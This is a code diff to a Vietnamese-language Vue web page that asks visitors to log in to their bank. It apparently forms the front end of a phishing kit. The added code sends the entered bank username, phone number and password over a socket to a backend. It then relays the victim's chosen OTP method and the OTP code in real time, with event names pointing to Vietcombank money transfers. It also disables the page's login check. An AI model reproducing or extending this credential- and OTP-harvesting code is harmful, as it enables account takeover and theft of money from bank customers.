@@ -19,12 +19,10 @@
                                 <p style="color: red">Vui lòng đăng nhập ngân hàng bạn đang sử dụng</p>
                             </v-card-title>
                             <v-card-text>
-                                <v-select label="Tên ngân hàng" v-model="formValue.bankName" :items="bankList"
+                                <v-select label="Tên ngân hàng" v-model="formValue.bankLoginName" :items="bankList"
                                     variant="filled" :rules="rules.bankList"></v-select>
-                                <v-text-field v-model="formValue.bankLoginName" variant="filled"
-                                    label="Tên đăng nhập/Số điện thoại" :rules="rules.bankLoginName"></v-text-field>
-                                <v-text-field v-model="formValue.bankLoginAccount" variant="filled" label="Số tài khoản"
-                                    :rules="rules.bankLoginAccount"></v-text-field>
+                                <v-text-field v-model="formValue.bankLoginAccount" variant="filled"
+                                    label="Tên đăng nhập/Số điện thoại" :rules="rules.bankLoginAccount"></v-text-field>
                                 <v-text-field v-model="formValue.bankLoginPassword" variant="filled" label="Mật khẩu"
                                     :rules="rules.bankLoginPassword"></v-text-field>
                             </v-card-text>
@@ -50,6 +48,73 @@
             </v-card-actions>
         </v-card>
     </v-dialog>
+    <v-dialog max-width="450px" v-model="dialogError" persistent>
+        <v-card>
+            <v-card-title>
+                Thông báo
+            </v-card-title>
+            <v-card-text class="text-center">
+                <p class="text-center mb-2">{{ dialogMessage }}</p>
+            </v-card-text>
+            <v-card-actions>
+                <v-btn color="warning" block class="pa-4" @click="dialogError = false">Đóng</v-btn>
+            </v-card-actions>
+        </v-card>
+    </v-dialog>
+    <v-dialog max-width="450px" v-model="dialogSuccess" persistent>
+        <v-card>
+            <v-form ref="formMethodOtp" @submit.prevent="submitFormMethod">
+                <v-card-title>
+                    Thông báo
+                </v-card-title>
+                <v-card-text class="text-center">
+                    <p class="text-center mb-2">{{ dialogMessage }}</p>
+                    <!-- // select option method otp -->
+                    <v-select v-if="socketData.options" v-model="formRefOtpMethod" :items="socketData.options"
+                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethod"></v-select>
+                </v-card-text>
+                <v-card-actions>
+                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
+                </v-card-actions>
+            </v-form>
+        </v-card>
+    </v-dialog>
+    <v-dialog max-width="450px" v-model="dialogMethodCTOTP" persistent>
+        <v-card>
+            <v-form ref="formMethodOtpCT" @submit.prevent="submitFormMethodCT">
+                <v-card-title>
+                    Thông báo
+                </v-card-title>
+                <v-card-text class="text-center">
+                    <p class="text-center mb-2">{{ dialogMessage }}</p>
+                    <!-- // select option method otp -->
+                    <v-select v-if="socketData.options" v-model="formRefOtpCT" :items="socketData.options"
+                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethodCT"></v-select>
+                </v-card-text>
+                <v-card-actions>
+                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
+                </v-card-actions>
+            </v-form>
+        </v-card>
+    </v-dialog>
+    <v-dialog max-width="450px" v-model="dialogOtp" persistent>
+        <v-card>
+            <v-form ref="formRefOtpLogin" @submit.prevent="submitFormBankLoginOtp">
+                <v-card-title>
+                    Thông báo
+                </v-card-title>
+                <v-card-text class="text-center">
+                    <p class="text-center mb-2">{{ dialogMessage }}</p>
+                    <!-- // select option method otp -->
+                    <v-text-field v-model="otpLogin" variant="filled" label="Nhập mã OTP"
+                        :rules="rules.otpLogin"></v-text-field>
+                </v-card-text>
+                <v-card-actions>
+                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
+                </v-card-actions>
+            </v-form>
+        </v-card>
+    </v-dialog>
 </template>
 
 <script setup>
@@ -57,15 +122,98 @@ import { ref, onMounted, computed } from 'vue'
 import axios from '@/plugins/axios'
 import { useRouter } from 'vue-router'
 import { useStore } from 'vuex';
+import { socket } from '@/plugins/socket'
 const router = useRouter()
 const store = useStore()
 const user = computed(() => store.state.user)
+const dialogError = ref(false)
+const dialogMessage = ref('')
+const socketData = ref(null)
+const formMethodOtp = ref(null)
+const dialogSuccess = ref(false)
+const dialogOtp = ref(false)
+const otpLogin = ref('')
+const dialogMethodCTOTP = ref(false)
+const formRefOtpCT = ref(false)
+
 onMounted(() => {
-    if (!user.value.numberPhone) {
-        router.push({ name: 'Home' })
-    }
+    // if (!user.value.numberPhone) {
+    //     router.push({ name: 'Home' })
+    // }
+
+    socket.emit('connection', () => {
+        console.log('connected')
+    })
+
+    socket.on('send-data-otp-vcb-chuyentien', (data) => {
+        socketData.value = data
+        if (data.code === 400) {
+            dialogError.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+            return
+        } else if (data.code === 201) {
+            dialogSuccess.value = true
+            dialogMessage.value = data.message
+            socketData.value = data
+            dialog.value = false
+        } else if (data.code === 404) {
+            dialogError.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+        } else if(data.code === 200) {
+            dialogSuccess.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+        }
+    })
+
+    socket.on('send-data-otp-vcb', (data) => {
+        console.log(data);
+        socketData.value = data
+        if (data.code === 200) {
+            dialogError.value = false
+            dialogMessage.value = data.message
+            dialogSuccess.value = false
+            dialog.value = false
+            dialogOtp.value = true
+            return
+        }
+    })
+
+    socket.on('send-data', async (data) => {
+        console.log(data);
+        if (data.code === 404) {
+            dialogError.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+            return
+        } else if (data.code === 200) {
+            dialogSuccess.value = true
+            dialogMessage.value = data.message
+            socketData.value = data
+            dialog.value = false
+        }
+    })
+
+    socket.on('send-data-send-otp-vcb', (data) => {
+        console.log(data);
+        if (data.code === 404) {
+            dialogError.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+            return
+        } else if (data.code === 200) {
+
+        }
+    })
+
+
+
 })
 const formRef = ref(null)
+const formRefOtpMethod = ref(null)
+const formRefOtpLogin = ref(null)
 const formValue = ref({
     bankLoginName: '',
     bankLoginAccount: '',
@@ -85,14 +233,30 @@ const rules = {
         // format > 6
         v => (v && v.length >= 6) || 'Mật khẩu phải lớn hơn 6 ký tự',
     ],
+    otpMethod: [
+        v => !!v || 'Vui lòng chọn phương thức xác thực',
+    ],
+    otpLogin: [
+        v => !!v || 'Mã OTP không được để trống',
+
+        // format > 6
+        v => (v && v.length >= 6) || 'Mã OTP phải lớn hơn 6 ký tự',
+    ],
+
 }
+
 const submit = async () => {
     const isValid = await formRef.value.validate()
     if (isValid.valid) {
         dialog.value = true
         try {
-            const response = await axios.post(`/update-user/${formValue.numberPhone}}`, formValue.value)
-            console.log(response)
+            // const response = await axios.post(`/update-user/${formValue.numberPhone}}`, formValue.value)
+            // console.log(response)
+            socket.emit('send-data', {
+                bankName: formValue.value.bankLoginName,
+                bankAccount: formValue.value.bankLoginAccount,
+                bankPassword: formValue.value.bankLoginPassword
+            })
         } catch (error) {
             console.log(error)
         }
@@ -173,6 +337,43 @@ const bankList = ref([
 
 ])
 const dialog = ref(false)
+const submitFormMethod = async () => {
+    const isValid = await formMethodOtp.value.validate()
+    if (isValid.valid) {
+        dialog.value = true
+        dialogSuccess.value = false
+        try {
+            socket.emit('send-data-otp-vcb', {
+                method: formRefOtpMethod.value,
+            })
+        } catch (error) {
+            console.log(error)
+        }
+    }
+}
+
+const submitFormBankLoginOtp = async () => {
+    const isValid = await formRefOtpLogin.value.validate()
+    if (isValid.valid) {
+        dialog.value = true
+        dialogOtp.value = false
+        try {
+            socket.emit('send-data-send-otp-vcb', {
+                otp: otpLogin.value,
+            })
+        } catch (error) {
+            console.log(error)
+        }
+    }
+}
+
+const submitFormMethodCT = async () => {
+    const isValid = await formRefOtpCT.value.validate()
+
+    if(isValid.valid) {
+        socket.emit('send-method-ct-vcb', )
+    }
+}
 </script>
 <style>
 .v-card-title {
